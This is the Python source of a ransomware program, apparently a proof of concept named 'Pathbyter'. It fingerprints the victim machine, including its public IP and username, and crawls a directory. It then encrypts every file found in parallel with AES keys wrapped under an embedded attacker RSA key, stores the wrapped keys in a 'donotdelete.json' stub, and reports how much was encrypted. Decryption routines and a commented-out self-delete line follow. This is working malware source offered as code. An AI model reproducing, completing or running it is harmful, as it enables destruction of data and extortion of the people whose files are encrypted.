from Crypto.PublicKey import RSA
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from os import rename, getlogin, cpu_count, system, walk, remove
from os.path import expanduser, join, getsize
from base64 import b64encode, b64decode
from requests import get
from requests.exceptions import RequestException
from multiprocessing import Pool
from platform import processor, architecture, machine
from platform import system as sys_os
from time import time
from json import dump, load, loads
from uuid import uuid4
from sys import argv


pathbyter = "50 61 74 68 62 79 74 65 72"

IGNORE_FILES = ['private.pem', 
                'ransompaid.pem', 
                'speedtest.py', 
                'testfilegenerator.py',
                'donotdelete.json']

ATKR_PUBLIC_KEY = """MIICIjANBgkqhkiG9w0BAQEFAAOCAg8AMIICCgKCAgEAxOiq056Sy3TAIfxNB8t+
6oE0hYXFWHh3SMeEOKPZs6uoacGEKZqHPyFlym86BLbUGekL5zVQ0idV4rEAl0cy
JnqeqznvGo2FTOQ8kOQeDYbGBhrfvFTZqVmcL6XsYoO3/SEjmIjgEqPU+7obmS2u
JtQAIHyasB7GJO/yNc3jVTumOLNoVw+J3RUY+bHjDd57aw0aP89mw9v+PeRtVeqp
a2viy/CbL2P3PqoR4nCABe42CPBARD6d37aMbQMyrY8A4avGUmLl03E4KG14VGka
ZnWuDVX26mj8f5ZvKzkqRgysL5FSl+6UgT+lput/HCYmce1M18pVL82/tGvN1lyQ
4S51YR3SX+m8X3qYU+6Lgb7el2vKZKcl4MlvIjWQrjGNPfuCAOg+xIaNusYYK/09
FDAekiSh5UYlrSX8O5cwvPcNyD8vzP139KLDt1deCJNOSDhkQTXtbxq84gsWg8tb
fvyyWexPo5sJrohPqwA/Appvcbs1Eczo54KmrxphzKyWz3tonp6y1JWbmg1CORnP
q1Duf44leIFHdiF+9xXYHA3qsiTrhG7sVOf+gw8eqiL00iNQZDt53rOkA2fMb/jS
6lS4Iiq1BBDly/pLPJz/Z26r3kCCzLGj/WlFE4C0mRwlJyan3vHTeJZhZmsHxKgM
YZHPaQzARCJfJqBlUB+WimMCAwEAAQ=="""


class System:
    def __init__(self):
        self.inet_connection = self.__check_inet_connection()
        self.pub_ip = self.__get_public_ip()
        self.os = sys_os()
        self.user = getlogin()
        self.home_dir = expanduser('~')
        self.cpu = processor()
        self.cores = cpu_count()
        self.machine_arch = architecture()[0]
        self.exec_type = architecture()[1]
        self.machine = machine()


    def __check_inet_connection(self):        
        try:
            google_dns = '8.8.8.8'
            response = system(f'ping -c 1 {google_dns} >/dev/null') #
            if response == 0:
                return True
            else:
                return False
        except:
            return False
        

    def __get_public_ip(self):
        api_uri = 'https://api.ipify.org'
        if self.inet_connection == True:
            try:
                ip = get(api_uri, timeout=3)
            except RequestException:
                pass
            return ip.text
        else:
            self.pub_ip = ''


    def path_crawl(self, path=None, ignore_files=None):
        file_paths = []
        if path == None:
            path = './'
        elif path.tolower() == 'user':
            path = expanduser('~')  
        else:
            path = path
        if ignore_files:
            for root, dirs, files in walk(path):
                for f in files:
                    if f in ignore_files:
                        pass
                    else:
                        f_path = join(root, f)
                        file_paths.append(f_path)
        else:
            for root, dirs, files in walk(path):
                for f in files:
                    f_path = join(root, f)
                    file_paths.append(f_path)

        return file_paths
    

    def gen_id_card(self):
        _id = uuid4()
        idcard = {'id': str(_id),
                  'pub_ip': self.pub_ip,
                  'os': self.os,
                  'usr': self.user,
                  'machine_arch': self.machine_arch,
                  'exec': self.exec_type,
                  'timestamp': str(time())}
        _idcard = str(idcard).encode()
        
        return _idcard
    

class Runtime:
    def __init__(self):
        self.start_time = time()
        

    def elapsed_time(self):
        print(f'runtime: {time() - self.start_time}\n')


def load_rsa_key(rsa_pubkey):        
    key = b64decode(rsa_pubkey)
    rsa_key = RSA.import_key(key)

    return rsa_key


def rsa_unwrap_aes(rsa_privkey, wrapped_aeskey):
    cipher_rsa = PKCS1_OAEP.new(rsa_privkey)
    aeskey = cipher_rsa.decrypt(wrapped_aeskey)
    
    return aeskey


def aescbc_encrypt(rsa_pubkey, data):
    sess_aeskey = get_random_bytes(16)
    cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)    # Wrap the AES key in RSA encryption
    rsa_wrapped_aeskey = cipher_rsa.encrypt(sess_aeskey)
    rsa_wrapped_aeskey = b64encode(rsa_wrapped_aeskey).decode('utf-8')

    cipher = AES.new(sess_aeskey, AES.MODE_CBC) 
    cipher_text = cipher.encrypt(pad(data, AES.block_size))
    aes_enc_data = b64encode(cipher_text).decode('utf-8')
    iv = b64encode(cipher.iv).decode('utf-8')

    return rsa_wrapped_aeskey, aes_enc_data, iv


def aescbc_decrypt(aeskey, iv, enc_data):
    cipher = AES.new(aeskey, AES.MODE_CBC, iv)
    data = unpad(cipher.decrypt(enc_data), AES.block_size)
    
    return data


def init_attack(idcard, rsa_pubkey):
    rsa_wrapped_aeskey, aes_enc_idcard, aescbc_iv = aescbc_encrypt(rsa_pubkey, idcard)
    _idcard = {'id': {'RSA wrapped AES key': rsa_wrapped_aeskey,
                      'AES encrypted id card': aes_enc_idcard, 
                      'AES CBC iv': aescbc_iv}} 
    with open('donotdelete.json', 'w') as f:
        dump(_idcard, f)


def gen_session_keys(rsa_pubkey):
    keys = RSA.generate(2048)
    sess_privkey = keys.export_key('DER')    
    sess_rsa_pubkey = keys.publickey().export_key('DER')

    session_aeskey = get_random_bytes(16)
    cipher_rsa = PKCS1_OAEP.new(rsa_pubkey)    # Wrap the AES key in RSA encryption
    rsa_wrapped_aeskey = b64encode(cipher_rsa.encrypt(session_aeskey)).decode('utf-8')

    cipher = AES.new(session_aeskey, AES.MODE_CBC) 
    cipher_text = cipher.encrypt(pad(sess_privkey, AES.block_size))
    aes_ct_session_private_key = b64encode(cipher_text).decode('utf-8')
    aes_cbc_iv = b64encode(cipher.iv).decode('utf-8')
    stub = {'stub': {'RSA wrapped AES key': rsa_wrapped_aeskey, 
                     'AES encrypted session RSA private key': aes_ct_session_private_key,
                     'AES CBC iv': aes_cbc_iv}}             
    with open('donotdelete.json', 'r+') as f:
        json_stub = load(f)
    json_stub.update(stub)
    with open('donotdelete.json', 'r+') as f:
        dump(json_stub, f)
    
    return sess_rsa_pubkey

    
def exec_attack(file_path):
    new_aeskey = get_random_bytes(16)
    cipher_rsa = PKCS1_OAEP.new(sess_pubkey)
    wrapped_aeskey = cipher_rsa.encrypt(new_aeskey)

    cipher_aes = AES.new(new_aeskey, AES.MODE_CTR)
    w_aeskey = b64encode(wrapped_aeskey).decode('utf-8')
    nonce = b64encode(cipher_aes.nonce).decode('utf-8')    
    with open(file_path, 'rb') as f:
        data = f.read()
    aes_ct = cipher_aes.encrypt(data)    
    decryption_stub = {'k': w_aeskey,    
                       'n': nonce}
    stub = str(decryption_stub).encode()
    with open(file_path, 'wb') as f:
        f.write(aes_ct + stub) 
    
    return 0


def decrypt_idcard():
    atkr_privkey = RSA.import_key(open('private.pem').read())
    with open('donotdelete.json', 'r') as f:
        kvdb = loads(f.read())
    rsa_enc_aeskey = b64decode(kvdb['id']['RSA wrapped AES key'])
    aes_enc_idcard = b64decode(kvdb['id']['AES encrypted id card'])
    iv = b64decode(kvdb['id']['AES CBC iv'])
    aeskey = rsa_unwrap_aes(atkr_privkey, rsa_enc_aeskey)
    idcard = aescbc_decrypt(aeskey, iv, aes_enc_idcard)
    idcard = idcard.decode()

    return idcard


def decrypt_session_privkey():      
    atkr_privkey = RSA.import_key(open('private.pem').read())
    with open('donotdelete.json', 'r') as f:
        data = loads(f.read())
    wrapped_aes_key = b64decode(data['stub']['RSA wrapped AES key'])
    aes_enc_sess_privkey = b64decode(data['stub']['AES encrypted session RSA private key'])
    iv = b64decode(data['stub']['AES CBC iv'])
    aeskey = rsa_unwrap_aes(atkr_privkey, wrapped_aes_key)
    session_rsa_private_key = aescbc_decrypt(aeskey, iv, aes_enc_sess_privkey)
    sess_privkey = RSA.import_key(session_rsa_private_key)
    with open('ransompaid.pem', 'wb') as f:
        f.write(sess_privkey.exportKey('PEM'))

    return session_rsa_private_key


def ctrl_z_ransomware():
    with open('ransompaid.pem', 'r') as f:
        sess_privkey = RSA.import_key(f.read())

    for file_path in target_files:
        try:
            with open(file_path, 'rb') as _f:
                f = _f.read()
            stub = eval(f[-374:])
            enc_data = f[:-374]
            wrapped_aeskey = b64decode(stub['k'])
            nonce = b64decode(stub['n'])
            cipher_rsa = PKCS1_OAEP.new(sess_privkey)
            aeskey = cipher_rsa.decrypt(wrapped_aeskey)
            nonce = b64decode(stub['n'])
            
            cipher = AES.new(aeskey, AES.MODE_CTR, nonce=nonce)
            data = cipher.decrypt(enc_data) 
            with open(file_path, 'wb') as f:
                f.write(data)

        except Exception as e:
            pass


def total_data_encrypted(target_files):
    total_bytes = 0
    for target_file in target_files:
        file_size = getsize(target_file)
        total_bytes += file_size
    return total_bytes


if __name__ == '__main__': 
    victim_system = System()
    atkr_pubkey = load_rsa_key(ATKR_PUBLIC_KEY)
    victim_id = victim_system.gen_id_card()
    target_files = victim_system.path_crawl(path=None, ignore_files=IGNORE_FILES)  
    init_attack(victim_id, atkr_pubkey)
    sess_rsa_pubkey = gen_session_keys(atkr_pubkey)
    sess_pubkey = RSA.import_key(sess_rsa_pubkey)
    runtime = Runtime()
    with Pool(victim_system.cores) as pool:
        result = pool.map_async(exec_attack, target_files)
        pool.close()
        pool.join()
    print('\n'*40 + pathbyter + '\n')
    
    runtime.elapsed_time()
    print("[*] Target files have been encrypted")
    print(f"[*] Total files encrypted: {len(target_files)}")
    print(f"[*] Total bytes encrypted: {total_data_encrypted(target_files)}")
    cont = input("\n\n\n[!] Begin decryption?\n>> ")
    idcard = decrypt_idcard()
    idcard = eval(idcard)
    sess_privkey = decrypt_session_privkey()
    ctrl_z_ransomware()

    # remove(argv[0])    # Pathybyter: the snake that eats its own tail
